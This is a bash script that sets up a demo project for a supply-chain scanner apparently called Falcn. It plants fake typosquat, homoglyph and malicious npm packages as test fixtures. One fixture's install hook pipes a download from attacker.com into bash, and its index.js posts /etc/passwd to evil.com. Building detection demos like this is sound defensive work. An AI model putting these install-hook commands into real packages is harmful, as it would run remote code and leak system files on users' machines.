#!/bin/bash

# Setup Magic Demo for Falcn
echo "Setting up 'Magic' Demo..."

DEMO_DIR="falcn-magic-demo"
mkdir -p $DEMO_DIR
cd $DEMO_DIR

# Create a seemingly innocent project
echo "{
  \"name\": \"my-awesome-app\",
  \"version\": \"1.0.0\",
  \"dependencies\": {
    \"react\": \"^18.2.0\",
    \"lodash-utils\": \"^99.9.9\"
  }
}" > package.json

# Create the malicious package in node_modules (simulating installation)
mkdir -p node_modules/lodash-utils
echo "{
  \"name\": \"lodash-utils\",
  \"version\": \"99.9.9\",
  \"description\": \"Helpful utilities for lodash\",
  \"scripts\": {
    \"install\": \"curl -s http://attacker.com/steal | bash\"
  }
}" > node_modules/lodash-utils/package.json

# Create suspicious file
echo "
// suspicious code
const exec = require('child_process').exec;
exec('curl -d @/etc/passwd http://evil.com');
" > node_modules/lodash-utils/index.js

# 2. Homoglyph Attack: "reаct" (Cyrillic 'a')
# Normal: react (U+0061)
# Homoglyph: reаct (U+0430)
HOMOGLYPH_DIR="node_modules/reаct"
mkdir -p $HOMOGLYPH_DIR
echo "{
  \"name\": \"reаct\",
  \"version\": \"18.2.0\",
  \"description\": \"Imposter React package with Cyrillic 'a'\",
  \"scripts\": {
    \"postinstall\": \"echo 'Extracting ENV keys...' > /tmp/hacked\"
  }
}" > $HOMOGLYPH_DIR/package.json

# 3. Typosquatting: "chalks" (vs "chalk")
TYPO_DIR="node_modules/chalks"
mkdir -p $TYPO_DIR
echo "{
  \"name\": \"chalks\",
  \"version\": \"5.3.0\",
  \"description\": \"Typosquat of chalk\",
  \"scripts\": {
    \"preinstall\": \"node install.js\"
  }
}" > $TYPO_DIR/package.json
echo "console.log('Stealing crypto wallet keys...');" > $TYPO_DIR/install.js

# Update main package.json to include these
echo "{
  \"name\": \"my-awesome-app\",
  \"version\": \"1.0.0\",
  \"dependencies\": {
    \"react\": \"^18.2.0\",
    \"reаct\": \"^18.2.0\", 
    \"lodash-utils\": \"^99.9.9\",
    \"chalks\": \"^5.0.0\"
  }
}" > package.json

echo "Demo setup complete in ./$DEMO_DIR"
echo "Run: falcn scan ./$DEMO_DIR"
